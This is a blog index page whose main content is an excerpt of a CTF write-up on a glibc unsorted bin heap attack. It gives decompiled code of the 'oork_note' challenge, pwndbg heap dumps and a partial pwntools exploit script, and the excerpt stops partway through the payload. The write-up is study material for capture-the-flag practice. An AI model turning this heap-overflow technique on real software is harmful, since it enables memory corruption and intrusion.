<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>å”ä»”æ©™</title><meta name="author" content="å”ä»”æ©™,tangzicheng233@gmail.com"><meta name="copyright" content="å”ä»”æ©™"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="å–œæ¬¢æ¢ç´¢ä¸–ç•Œ,åœ¨è¯»ç ”ç©¶ç”Ÿ,è®¡ç®—æœºçˆ±å¥½è€…çš„æˆé•¿è®°å½•">
<meta property="og:type" content="website">
<meta property="og:title" content="å”ä»”æ©™">
<meta property="og:url" content="https://tangzichengcc.github.io/page/7/index.html">
<meta property="og:site_name" content="å”ä»”æ©™">
<meta property="og:description" content="å–œæ¬¢æ¢ç´¢ä¸–ç•Œ,åœ¨è¯»ç ”ç©¶ç”Ÿ,è®¡ç®—æœºçˆ±å¥½è€…çš„æˆé•¿è®°å½•">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="å”ä»”æ©™">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/page/7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":500,"languages":{"author":"ä½œè€…: å”ä»”æ©™","link":"é“¾æ¥: ","source":"æ¥æº: å”ä»”æ©™","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'å”ä»”æ©™',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-01-28 22:42:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">å”ä»”æ©™</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">å”ä»”æ©™</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/" title="pwnå…¥é—¨-10-å †å…¥é—¨ä¹‹å †æº¢å‡ºåŠunsorted_binæ”»å‡»">pwnå…¥é—¨-10-å †å…¥é—¨ä¹‹å †æº¢å‡ºåŠunsorted_binæ”»å‡»</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-02-24T02:06:55.000Z" title="å‘è¡¨äº 2023-02-24 10:06:55">2023-02-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-06-09T12:27:31.453Z" title="æ›´æ–°äº 2023-06-09 20:27:31">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWNå…¥é—¨</a></span></div><div class="content">â€‹		å †é¢˜å…¶å®æ˜¯ç›®å‰æ¯”è¾ƒåŸºç¡€çš„é¢˜,æ ˆé¢˜éƒ½æ¯”è¾ƒå°‘äº†è²Œä¼¼â€¦è‡ªå·±çš„è¿›åº¦æœ‰ç‚¹æ…¢,è™½ç„¶ä¸Šå­¦æœŸæ¥è§¦åˆ°äº†å †,ä½†ä¹Ÿå­¦çš„ä¸€çŸ¥åŠè§£.
â€‹		æœ€è¿‘ä¸Šäº†NeSEåˆ›å§‹äººã€å¸¦é˜Ÿè€å¸ˆé¾šè€å¸ˆçš„è¯¾,è€å¸ˆç¬¬ä¸€èŠ‚è¯¾ç»™çš„æµ‹è¯•é¢˜å°±æ˜¯ä¸€é“å †é¢˜,çœ‹äº†çœ‹ä»–åé¢çš„è¯¾ä»¶,é‡ç‚¹ä¹Ÿåœ¨å †ä¸Š,æ‰€ä»¥è§‰å¾—å¯ä»¥å…ˆæŠŠæ ˆä»€ä¹ˆçš„ç¨å¾®æ”¾ä¸€æ”¾äº†,åŸºç¡€å…¶å®å·®ä¸å¤šäº†,æå‡çš„è¯,å¯ä»¥æ…¢æ…¢æ¥,å…ˆèµ¶ç´§ç»§ç»­å­¦å †.
â€‹		
é¢˜ç›®é“¾æ¥: æœ¬ç¯‡åšå®¢åœ°å€url + oork_noteå³å¯
unsorted binåŸºç¡€çŸ¥è¯†å‚è€ƒ:https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/
â€‹		Unsorted Bin Attack è¢«åˆ©ç”¨çš„å‰ææ˜¯æ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆã€‚
â€‹		Unsorted Bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ã€‚
åŸºæœ¬æ¥æº
å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚
é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­ã€‚å…³äº top chunk çš„è§£é‡Šï¼Œè¯·å‚è€ƒä¸‹é¢çš„ä»‹ç»ã€‚
å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ã€‚

æ”»å‡»åŸç†     åœ¨ [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) ä¸­çš„ `_int_malloc` æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼Œå½“å°†ä¸€ä¸ª unsorted bin å–å‡ºçš„æ—¶å€™ï¼Œä¼šå°† `bck-&gt;fd` çš„ä½ç½®å†™å…¥æœ¬ Unsorted Bin çš„ä½ç½®,å°±æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å€¼,æ¯”å¦‚0xffffffffxxxx

â€‹	æ¢å¥è¯è¯´, bck-&gt;fd ä¹Ÿå°±æ˜¯ bk(ä¹Ÿå°±æ˜¯è¦ä¿®æ”¹çš„åœ°å€,æ‰€ä»¥æº¢å‡ºä¿®æ”¹çš„chunkçš„bkåº”è¯¥æ˜¯è¦ä¿®æ”¹çš„åœ°å€-0x10),  victim-&gt;bk-&gt;fd &#x3D; victim
â€‹	avæ˜¯å½“å‰chunk, (av)-&gt;bk &#x3D; bck,å°±æ˜¯å½“å‰chunkçš„bk, æ™•äº†æ™•äº†,å›å¤´çœ‹çœ‹æºç  victim, avä»€ä¹ˆçš„

12345/* remove from unsorted list */if (__glibc_unlikely (bck-&gt;fd != victim))  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);



æµ‹è¯•é¢˜ç›® oork_noteâ€‹		ä¸€çœ‹å°±æ˜¯ä¸€é“å †é¢˜,ç»™å‡ºäº†ä¸€ä¸ªèœå•.ç„¶åä¼šè®©ä½ è¾“å…¥7æ¬¡,ä¹Ÿå°±æ˜¯ä¸€å‘¨çš„æ—¥è®°,è¦è¾“å…¥é•¿åº¦å’Œå†…å®¹,è¿™é‡Œæ²¡æœ‰é—®é¢˜,æ³¨æ„ä¸€ä¸ªç»†èŠ‚,å°±æ˜¯ä½ è¾“å…¥çš„é•¿åº¦ä¼šæœ‰ä¸ªæ“ä½œ v2 +&#x3D; 144;  ä¹Ÿå°±æ˜¯å¢å¤§äº†0x90,è¿™ä¸ªåé¢ä¼šç”¨åˆ°
â€‹		ç„¶åå°±æ˜¯ç¼–è¾‘å’Œåˆ é™¤æ“ä½œäº†,
â€‹		æ‹¿flagå…¶å®å¾ˆæ˜æ˜¾,å°±æ˜¯è¦æŠŠ0x6020D4çš„å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªæ¯”167å¤§çš„å€¼å°±å¯ä»¥äº†
123456789101112131415161718192021222324252627282930313233343536373839404142__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v4; // [rsp+8h] [rbp-8h]  int v5; // [rsp+Ch] [rbp-4h]  sub_4008F6();  puts(&quot;Welcome to 997 wellfare! This program records your weekly workloads.&quot;);  v4 = 0;  v5 = 0;  while ( v4 &lt;= 6 )  &#123;    printf(&quot;Day %d in this weekend.\n&quot;, (unsigned int)(v4 + 1));    v5 += sub_400939(v4++);  &#125;  puts(&quot;Do you need to edit your note? y/n&quot;);  getchar();  if ( getchar() == 121 )    sub_400B62();  if ( dword_6020D4 &gt; 167 )    system(&quot;cat ./flag&quot;);  else    puts(&quot;You are fired, Bye.&quot;);  return 0LL;&#125;__int64 __fastcall sub_400939(int a1)&#123;  int v2; // [rsp+1Ch] [rbp-14h] BYREF  void *buf; // [rsp+20h] [rbp-10h]  unsigned __int64 v4; // [rsp+28h] [rbp-8h]  v4 = __readfsqword(0x28u);  printf(&quot;\tInput the length of your work note:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v2);  v2 += 144;  buf = malloc(v2);  printf(&quot;\tInput context of your work record:&quot;);  read(0, buf, v2);  *(&amp;ptr + a1) = buf;  return (unsigned int)((v2 &amp; (rand() + 255)) % 23);&#125;

â€‹		ä¸‹é¢çœ‹ä¸€ä¸‹ç¼–è¾‘å’Œåˆ é™¤,åˆ é™¤çš„è¯,æŠŠæŒ‡é’ˆä¹Ÿèµ‹0äº†,æ‰€ä»¥æ²¡æœ‰double freeçš„é—®é¢˜,
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667unsigned __int64 sub_400B62()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  v1 = 0;  do  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        puts(&quot;Input your choice: \n\t1.edit note\n\t2.delete note\n\t0.exit&quot;);        __isoc99_scanf(&quot;%d&quot;, &amp;v1);        if ( v1 != 1 )          break;        sub_400A14();      &#125;      if ( v1 != 2 )        break;      sub_400AEE();    &#125;  &#125;  while ( v1 );  return __readfsqword(0x28u) ^ v2;&#125;unsigned __int64 sub_400A14()&#123;  int v0; // ebx  unsigned int v2; // [rsp+4h] [rbp-1Ch] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-18h]  v3 = __readfsqword(0x28u);  puts(&quot;input the note index to edit:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v2);  if ( v2 &lt;= 6 )  &#123;    puts(&quot;Input the content:&quot;);    if ( *(&amp;ptr + (int)v2) )    &#123;      read(0, *(&amp;ptr + (int)v2), 0x4F0uLL);    &#125;    else    &#123;      v0 = v2;      *(&amp;ptr + v0) = malloc(0x3A0uLL);      read(0, *(&amp;ptr + (int)v2), 0x3A0uLL);    &#125;  &#125;  return __readfsqword(0x28u) ^ v3;&#125;unsigned __int64 sub_400AEE()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;input the note index to delete:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  free(*(&amp;ptr + v1));  *(&amp;ptr + v1) = 0LL;  return __readfsqword(0x28u) ^ v2;&#125;

â€‹		ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªå¾ˆæ˜æ˜¾çš„é—®é¢˜,å°±æ˜¯åœ¨ç¼–è¾‘æ“ä½œè¿™é‡Œ,å¦‚æœç¼–è¾‘åœ°å€å­˜åœ¨,å¯ä»¥è¯»å…¥0x4f0å¤§å°,å¦‚æœæˆ‘ä»¬ç”³è¯·çš„chunkå¤§å°æ¯”è¿™ä¸ªå°,é‚£ä¹ˆå°±å­˜åœ¨äº†æº¢å‡º,å¦‚æœç¼–è¾‘çš„åœ°å€ä¸å­˜åœ¨,ä¼šé‡æ–°è¿›è¡Œmallocåœ°å€,å¤§å°ä¸º0x3A0
â€‹		ä¹Ÿå°±æ˜¯è¯´,å¦‚æœæˆ‘ä»¬ä¸€å¼€å§‹ç”³è¯·ä¸€ä¸ªå°çš„chunk,å®ƒåé¢æ¥ä¸€ä¸ª0x3A0å¤§å°çš„chunk,ç„¶åæŠŠ0x3A0å¤§å°çš„chunk freeæ‰,ç„¶åé€šè¿‡æº¢å‡º,æŠŠè¿™ä¸ªfreeæ‰ä¹‹åçš„chunkçš„å€¼ä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„(æŠŠbkæ”¹æˆæƒ³ä¿®æ”¹çš„åœ°å€),ç„¶åå†é‡æ–°ç¼–è¾‘ä¸€ä¸‹,é‡æ–°mallocçš„æ—¶å€™å°±ä¼šåˆç”³è¯·åˆ°è¿™ä¸ªfree çš„chunk(ä¹Ÿå°±æ˜¯unsorted bin),ç„¶åå°±ä¼šè§¦å‘æ¼æ´
12345678910if ( *(&amp;ptr + (int)v2) )    &#123;      read(0, *(&amp;ptr + (int)v2), 0x4F0uLL);    &#125; else    &#123;      v0 = v2;      *(&amp;ptr + v0) = malloc(0x3A0uLL);      read(0, *(&amp;ptr + (int)v2), 0x3A0uLL);    &#125;

â€‹		
æ„é€ æ”»å‡»é“¾â€‹		é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­ã€‚
â€‹		ä»€ä¹ˆæ˜¯ä¸å±äºfast binçš„å‘¢??
â€‹		é‚£æˆ‘ä»¬å°±ç¬¬ä¸€ä¸ªå€¼éšæ„,ç¬¬äºŒä¸ªå€¼æ„é€ å°ä¸€ç‚¹,æ¯”å¦‚0x20,ç¬¬ä¸‰ä¸ªå€¼æ„é€ æˆ0x3A0,ç„¶ååé¢éšæ„,ç„¶ååˆ é™¤ç¬¬ä¸‰ä¸ªå€¼,ä¿®æ”¹ç¬¬äºŒä¸ªå€¼,è¦†ç›–æ‰å®ƒ,ç„¶åå†editç¬¬ä¸‰ä¸ªå€¼,è¿›è¡Œé‡æ–°ç”³è¯·,è§¦å‘æ¼æ´è·å–flag.
â€‹		è¿™é‡Œæ³¨æ„ä¹‹å‰æ‰€è¯´çš„,æˆ‘ä»¬ç»™çš„å¤§å°,å®ƒå®é™…ä¸Šä¼š+0x90,æ‰€ä»¥è¦ç”³è¯·ä¸€ä¸ª0x3A0 - 0x90 &#x3D; 0x310 ä¹Ÿå°±æ˜¯784å¤§å°çš„å€¼
1234567891011121314151617pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x603000Size: 0xb1Allocated chunk | PREV_INUSEAddr: 0x6030b0Size: 0xc1Allocated chunk | PREV_INUSEAddr: 0x603170Size: 0x3b1Allocated chunk | PREV_INUSEAddr: 0x603520Size: 0xb1

â€‹		0xc1 193     144 + 32 &#x3D; 176    å¤šäº†17,  è¿™ä¸ªå¤šçš„16å­—èŠ‚æ˜¯prev_size + size + NMP, é‚£ä¸ºä»€ä¹ˆè¿˜å¤šäº†ä¸€å­—èŠ‚ å› ä¸ºå¯¹é½,åœ¨64ä½å¹³å°ä¸‹,chunkå¤§å°ä¸€å®šæ˜¯0x10çš„æ•´æ•°å€,é‚£ä¸ºä»€ä¹ˆéƒ½å¤šäº†1å‘¢?è¿™é‡Œå…¶å®ä¸æ˜¯å¤šäº†1,æ˜¯æ˜¾ç¤ºçš„é—®é¢˜,sizeçš„è¯,æ˜¯å‰5å­—èŠ‚,ä¹Ÿå°±æ˜¯11000ä¹Ÿå°±æ˜¯16 + 4 &#x3D; 20, ç„¶åæœ€åçš„1æ˜¯æŒ‡çš„Pä¸º1,ä¹Ÿå°±æ˜¯å‰ä¸€ä¸ªchunkè¢«ä½¿ç”¨çš„æ„æ€,0æ˜¯æœªè¢«ä½¿ç”¨
12pwndbg&gt; x/bt 0x6030b80x6030b8:	11000001


â€‹		0xb1 177     144 + 12 &#x3D; 156    å¤šäº†21,
â€‹		0x3b1  945  144 + 784 &#x3D; 928 å¤šäº†17
â€‹		payloadçš„æ„é€ çš„è¯,å°±æ˜¯å¡«æ»¡ç¬¬2ä¸ªchunk,ç„¶åæº¢å‡º,å¡«æ»¡prev_size,ç„¶åä¿®æ”¹sizeä¸ºæ­£ç¡®å€¼,ç„¶ååŠ ä¸Šbk(è¦ä¿®æ”¹çš„åœ°å€)å°±å¯ä»¥äº†
â€‹		payload &#x3D; (0x90 + 0x20) * bâ€aâ€ + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)
p64æ˜¯ä¸ªå•¥,8byte, 8å­—èŠ‚,64ä½, æŒ‡ä»¤ä¸€è¡Œåˆæ˜¯å¤šå°‘..æœ‰ç‚¹æ™•
p64å°±æ˜¯64ä½æœºå™¨çš„ç¼–ç ,æŠŠ0ç¼–ç æˆ0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00,å 64ä½,ä¹Ÿå°±æ˜¯8ä¸ªå­—èŠ‚
è¿™ä¸ª64ä½,32ä½æŒ‡çš„æ˜¯ä¸€æ¬¡å¤„ç†æ•°æ®çš„å®½åº¦,å’ŒæŒ‡ä»¤é•¿åº¦ä»¥åŠä»–ä»¬çš„åœ°å€æ²¡å…³ç³»
æŒ‡ä»¤çš„è¯,å å¤šå°‘å­—èŠ‚éƒ½æ˜¯å¯èƒ½çš„
123456789101112131415161718192021222324252627â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ r13 rsp 0x7fffffffe560 â—‚â€” 0x101:0008â”‚         0x7fffffffe568 â€”â–¸ 0x7fffffffe7b7 â—‚â€” &#x27;/home/ubuntu/2yue/ezfmt&#x27;02:0010â”‚         0x7fffffffe570 â—‚â€” 0x003:0018â”‚         0x7fffffffe578 â€”â–¸ 0x7fffffffe7cf â—‚â€” 0x524f4c4f435f534c (&#x27;LS_COLOR&#x27;)â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f 0         0x4006e0â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€pwndbg&gt; x/8bx 0x7fffffffe5600x7fffffffe560:	0x01	0x00	0x00	0x00	0x00	0x00	0x00	0x00pwndbg&gt; x/8bx 0x7fffffffe5680x7fffffffe568:	0xb7	0xe7	0xff	0xff	0xff	0x7f	0x00	0x00.text:0000000000400BE3.text:0000000000400BE3                 push    rbp.text:0000000000400BE4                 mov     rbp, rsp.text:0000000000400BE7                 sub     rsp, 10h.text:0000000000400BEB                 mov     eax, 0.text:0000000000400BF0                 call    sub_4008F6.text:0000000000400BF5                 mov     edi, offset aWelcomeTo997We ; &quot;Welcome to 997 wellfare! This program r&quot;....text:0000000000400BFA                 call    _puts.text:0000000000400BFF                 mov     [rbp+var_8], 0.text:0000000000400C06                 mov     [rbp+var_4], 0.text:0000000000400C0D                 jmp     short loc_400C37.text:0000000000400C0F ; ---------------------------------------------------------------------------.text:0000000000400C0F

â€‹		æ‰€ä»¥ x&#x2F;20wx 0xxxxxxxxxxxx æ˜¾ç¤ºçš„ä¸€è¡Œå…¶å®æ˜¯16å­—èŠ‚, 128ä½, æ‰€ä»¥å·¦è¾¹çš„åœ°å€åŠ äº†16,
12345pwndbg&gt; x/20wx 0x6030b00x6030b0:	0x00000000	0x00000000	0x000000b1	0x000000000x6030c0:	0x000a3231	0x00000000	0x00000000	0x000000000x6030d0:	0x00000000	0x00000000	0x00000000	0x000000000x6030e0:	0x00000000	0x00000000	0x00000000	0x00000000



exp12345678910111213141516171819202122232425262728293031323334353637from pwn import *context.log_level= &quot;debug&quot;def add(length,context):    io.sendlineafter(&quot;note:&quot;,length)    io.sendlineafter(&quot;record:&quot;,context)def delete(num):    io.sendlineafter(&quot;exit&quot;,&quot;2&quot;)    io.sendlineafter(&quot;delete:&quot;,num)def edit(num,context):    io.sendlineafter(&quot;exit&quot;,&quot;1&quot;)    io.sendlineafter(&quot;edit:&quot;,num)    io.sendlineafter(&quot;content:&quot;,context)io = process(&quot;./oork_note&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io,&quot;b *0x7ffff7af2031&quot;)add(&quot;32&quot;,b&quot;12&quot;)add(&quot;32&quot;,b&quot;aaaa&quot;)add(&quot;784&quot;,b&quot;aaaaa&quot;)add(&quot;32&quot;,b&quot;12&quot;)add(&quot;32&quot;,b&quot;12&quot;)add(&quot;32&quot;,b&quot;12&quot;)add(&quot;32&quot;,b&quot;12&quot;)io.sendlineafter(&quot;note? y/n&quot;,&quot;y&quot;)delete(&quot;2&quot;)#payload = (0x90 + 0x20) * b&quot;a&quot; + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)#payload = (0x90 + 0x20) * b&quot;a&quot; + p64(0) + p64(0x3a0+0x1 + 0x10) +p64(0)+ p64(0x6020D4 - 0x10)addr = 0x06020D4 - 0x10payload = b&quot;a&quot;*176 + p64(0) + p64(0x3a1 + 0x10) + p64(0) + 